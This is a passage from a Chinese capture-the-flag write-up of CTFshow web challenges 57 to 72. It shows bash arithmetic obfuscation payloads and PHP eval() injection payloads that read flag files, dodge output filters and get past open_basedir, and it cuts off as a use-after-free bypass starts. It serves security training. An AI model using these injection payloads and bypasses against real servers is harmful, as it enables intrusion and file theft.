class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>)))))))))))<br>-16<br><br>┌──<span class="hljs-params">(root㉿butt3rf1y)</span>-[/home/butt3rf1y]<br>└─# echo $<span class="hljs-params">((<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))))))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>)))))))))))))<br>-32<br><br>┌──<span class="hljs-params">(root㉿butt3rf1y)</span>-[/home/butt3rf1y]<br>└─# echo $<span class="hljs-params">((<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))))))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))))))))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>)))))))))<br>-36<br><br>┌──<span class="hljs-params">(root㉿butt3rf1y)</span>-[/home/butt3rf1y]<br>└─# echo $<span class="hljs-params">((<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))))))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))))))))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))) $<span class="hljs-params">((<span class="hljs-string">$(</span>(~<span class="hljs-string">$(</span>()</span>))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>))))))))) $<span class="hljs-params">((~<span class="hljs-string">$(</span>()</span>)))))<br>-37<br></code></pre></td></tr></table></figure><p>最后的 payload 如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=$((~$(($(($(($(($(($(($(($(($((~$(()))) $((~$(()))))) $(($((~$(()))) $((~$(()))))))) $(($(($((~$(()))) $((~$(()))))) $(($((~$(()))) $((~$(()))))))))) $(($(($(($((~$(()))) $((~$(()))))) $(($((~$(()))) $((~$(()))))))) $(($(($((~$(()))) $((~$(()))))) $(($((~$(()))) $((~$(()))))))))))) $(($(($(($(($((~$(()))) $((~$(()))))) $(($((~$(()))) $((~$(()))))))) $(($(($((~$(()))) $((~$(()))))) $(($((~$(()))) $((~$(()))))))))) $(($(($(($((~$(()))) $((~$(()))))) $(($((~$(()))) $((~$(()))))))) $(($(($((~$(()))) $((~$(()))))) $(($((~$(()))) $((~$(()))))))))))))) $(($(($((~$(()))) $((~$(()))))) $(($((~$(()))) $((~$(()))))))))) $((~$(())))))))))<br></code></pre></td></tr></table></figure><p>查看源码拿到 flag</p><p><a href="https://c.biancheng.net/view/2480.html">Shell (()) 的用法</a></p><h1 id="Web-58"><a href="#Web-58" class="headerlink" title="Web 58"></a>Web 58</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: Lazzaro<br># @Date:   2020-09-05 20:49:30<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-09-07 22:02:47<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br><br>*/<br><br>// 你们在炫技吗？<br>if(isset($_POST[&#x27;c&#x27;]))&#123;<br>        $c= $_POST[&#x27;c&#x27;];<br>        eval($c);<br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure><p>可以直接用 <code>highlight_file</code> 函数输出文件内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">c=highlight_file(&#x27;flag.php&#x27;);<br></code></pre></td></tr></table></figure><h1 id="Web-59"><a href="#Web-59" class="headerlink" title="Web 59"></a>Web 59</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: Lazzaro<br># @Date:   2020-09-05 20:49:30<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-09-07 22:02:47<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br><br>*/<br><br>// 你们在炫技吗？<br>if(isset($_POST[&#x27;c&#x27;]))&#123;<br>        $c= $_POST[&#x27;c&#x27;];<br>        eval($c);<br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure><p>还是能用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">c=highlight_file(&#x27;flag.php&#x27;);<br></code></pre></td></tr></table></figure><p>还有其他函数也能读取</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">c=show_source(&#x27;flag.php&#x27;);<br></code></pre></td></tr></table></figure><h1 id="Web-60"><a href="#Web-60" class="headerlink" title="Web 60"></a>Web 60</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: Lazzaro<br># @Date:   2020-09-05 20:49:30<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-09-07 22:02:47<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br><br>*/<br><br>// 你们在炫技吗？<br>if(isset($_POST[&#x27;c&#x27;]))&#123;<br>        $c= $_POST[&#x27;c&#x27;];<br>        eval($c);<br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure><p>一样的 payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs url">c=show_source(&#x27;flag.php&#x27;);<br>c=highlight_file(&#x27;flag.php&#x27;);<br></code></pre></td></tr></table></figure><h1 id="Web-61-65"><a href="#Web-61-65" class="headerlink" title="Web 61-65"></a>Web 61-65</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: Lazzaro<br># @Date:   2020-09-05 20:49:30<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-09-07 22:02:47<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br><br>*/<br><br>// 你们在炫技吗？<br>if(isset($_POST[&#x27;c&#x27;]))&#123;<br>        $c= $_POST[&#x27;c&#x27;];<br>        eval($c);<br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure><p>同 Web 59</p><h1 id="Web-66"><a href="#Web-66" class="headerlink" title="Web 66"></a>Web 66</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: Lazzaro<br># @Date:   2020-09-05 20:49:30<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-09-07 22:02:47<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br><br>*/<br><br>// 你们在炫技吗？<br>if(isset($_POST[&#x27;c&#x27;]))&#123;<br>        $c= $_POST[&#x27;c&#x27;];<br>        eval($c);<br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure><p>这次前面的 payload 都不行了，列出 <code>/</code> 目录下的文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs url">c=print_r(scandir(&quot;/&quot;));<br>&gt;&gt;Array ( [0] =&gt; . [1] =&gt; .. [2] =&gt; .dockerenv [3] =&gt; bin [4] =&gt; dev [5] =&gt; etc [6] =&gt; flag.txt [7] =&gt; home [8] =&gt; lib [9] =&gt; media [10] =&gt; mnt [11] =&gt; opt [12] =&gt; proc [13] =&gt; root [14] =&gt; run [15] =&gt; sbin [16] =&gt; srv [17] =&gt; sys [18] =&gt; tmp [19] =&gt; usr [20] =&gt; var )<br></code></pre></td></tr></table></figure><p>读取 flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">c=highlight_file(&#x27;/flag.txt&#x27;);<br></code></pre></td></tr></table></figure><h1 id="Web-67"><a href="#Web-67" class="headerlink" title="Web 67"></a>Web 67</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: Lazzaro<br># @Date:   2020-09-05 20:49:30<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-09-07 22:02:47<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br><br>*/<br><br>// 你们在炫技吗？<br>if(isset($_POST[&#x27;c&#x27;]))&#123;<br>        $c= $_POST[&#x27;c&#x27;];<br>        eval($c);<br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>print_r()</code> 函数被禁了，<code>var_dump()</code> 和 <code>var_export()</code> 都能用</p><p>还是能用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">c=highlight_file(&#x27;/flag.txt&#x27;);<br></code></pre></td></tr></table></figure><h1 id="Web-68"><a href="#Web-68" class="headerlink" title="Web 68"></a>Web 68</h1><p>没有源码，只能用 <code>var_dump()</code> 函数打印，然后用 <code>include()</code> 函数读取</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">c=include(&#x27;/flag.txt&#x27;);<br></code></pre></td></tr></table></figure><h1 id="Web-69"><a href="#Web-69" class="headerlink" title="Web 69"></a>Web 69</h1><p><code>var_dump()</code> 不行，换成 <code>var_export()</code> 可以，然后</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">c=include(&#x27;/flag.txt&#x27;);<br></code></pre></td></tr></table></figure><h1 id="Web-70"><a href="#Web-70" class="headerlink" title="Web 70"></a>Web 70</h1><p>还是只能 <code>var_export()</code> ，然后 payload 同上</p><h1 id="Web-71"><a href="#Web-71" class="headerlink" title="Web 71"></a>Web 71</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: Lazzaro<br># @Date:   2020-09-05 20:49:30<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-09-07 22:02:47<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br><br>*/<br><br>error_reporting(0);<br>ini_set(&#x27;display_errors&#x27;, 0);<br>// 你们在炫技吗？<br>if(isset($_POST[&#x27;c&#x27;]))&#123;<br>        $c= $_POST[&#x27;c&#x27;];<br>        eval($c);<br>        $s = ob_get_contents();<br>        ob_end_clean();<br>        echo preg_replace(&quot;/[0-9]|[a-z]/i&quot;,&quot;?&quot;,$s);<br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br><br>?&gt;<br><br>你要上天吗？<br></code></pre></td></tr></table></figure><p>源码中的 <code>ob_get_contents()</code> 函数，会返回输出缓冲区的内容，<code>ob_end_clean</code> 清空缓冲区的内容并关闭</p><p>那么整个流程就是获取缓冲区的数据然后清空，再把所有的内容都替换成 <code>?</code> ，那么我们的思路就是在替换之前把内容劫持了</p><p>利用 <code>die()</code> 函数和 <code>exit()</code> 函数都能提前终止</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs url">c=var_export(scandir(&quot;/&quot;));die();<br>c=include(&#x27;/flag.txt&#x27;);die();<br></code></pre></td></tr></table></figure><h1 id="Web72"><a href="#Web72" class="headerlink" title="Web72*"></a>Web72*</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: Lazzaro<br># @Date:   2020-09-05 20:49:30<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-09-07 22:02:47<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br><br>*/<br><br>error_reporting(0);<br>ini_set(&#x27;display_errors&#x27;, 0);<br>// 你们在炫技吗？<br>if(isset($_POST[&#x27;c&#x27;]))&#123;<br>        $c= $_POST[&#x27;c&#x27;];<br>        eval($c);<br>        $s = ob_get_contents();<br>        ob_end_clean();<br>        echo preg_replace(&quot;/[0-9]|[a-z]/i&quot;,&quot;?&quot;,$s);<br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br><br>?&gt;<br><br>你要上天吗？<br></code></pre></td></tr></table></figure><p>列出目录文件时回显没有权限</p><figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs vhdl"><span class="hljs-literal">Warning</span>: error_reporting() has been disabled <span class="hljs-keyword">for</span> security reasons <span class="hljs-keyword">in</span> /var/www/html/index.php <span class="hljs-keyword">on</span> <span class="hljs-literal">line</span> <span class="hljs-number">14</span><br><br><span class="hljs-literal">Warning</span>: ini_set() has been disabled <span class="hljs-keyword">for</span> security reasons <span class="hljs-keyword">in</span> /var/www/html/index.php <span class="hljs-keyword">on</span> <span class="hljs-literal">line</span> <span class="hljs-number">15</span><br><br><span class="hljs-literal">Warning</span>: scandir(): open_basedir restriction <span class="hljs-keyword">in</span> effect. <span class="hljs-keyword">File</span>(/) <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> within the allowed path(s): (/var/www/html/) <span class="hljs-keyword">in</span> /var/www/html/index.php(<span class="hljs-number">19</span>) : eval()<span class="hljs-symbol">&#x27;d</span> code <span class="hljs-keyword">on</span> <span class="hljs-literal">line</span> <span class="hljs-number">1</span><br><br><span class="hljs-literal">Warning</span>: scandir(/): failed <span class="hljs-keyword">to</span> <span class="hljs-keyword">open</span> dir: Operation <span class="hljs-keyword">not</span> permitted <span class="hljs-keyword">in</span> /var/www/html/index.php(<span class="hljs-number">19</span>) : eval()<span class="hljs-symbol">&#x27;d</span> code <span class="hljs-keyword">on</span> <span class="hljs-literal">line</span> <span class="hljs-number">1</span><br><br><span class="hljs-literal">Warning</span>: scandir(): (errno <span class="hljs-number">1</span>): Operation <span class="hljs-keyword">not</span> permitted <span class="hljs-keyword">in</span> /var/www/html/index.php(<span class="hljs-number">19</span>) : eval()<span class="hljs-symbol">&#x27;d</span> code <span class="hljs-keyword">on</span> <span class="hljs-literal">line</span> <span class="hljs-number">1</span><br><span class="hljs-literal">false</span><br></code></pre></td></tr></table></figure><p><code>open_basedir</code> ：<a href="https://www.v0n.top/2020/07/10/open_basedir%e7%bb%95%e8%bf%87/">open_basedir绕过</a></p><p>使用 <code>glob://</code> 伪协议绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs url">c=var_export(scandir(&#x27;glob://*&#x27;));exit();#列出 open_basedir 允许的目录<br>c=var_export(scandir(&#x27;glob:///*&#x27;));die();#列出根目录<br></code></pre></td></tr></table></figure><p>还是不能读取文件，看了很多大佬的 WP</p><p>利用 uaf 绕过 <code>open_basedir</code> 执行命令</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 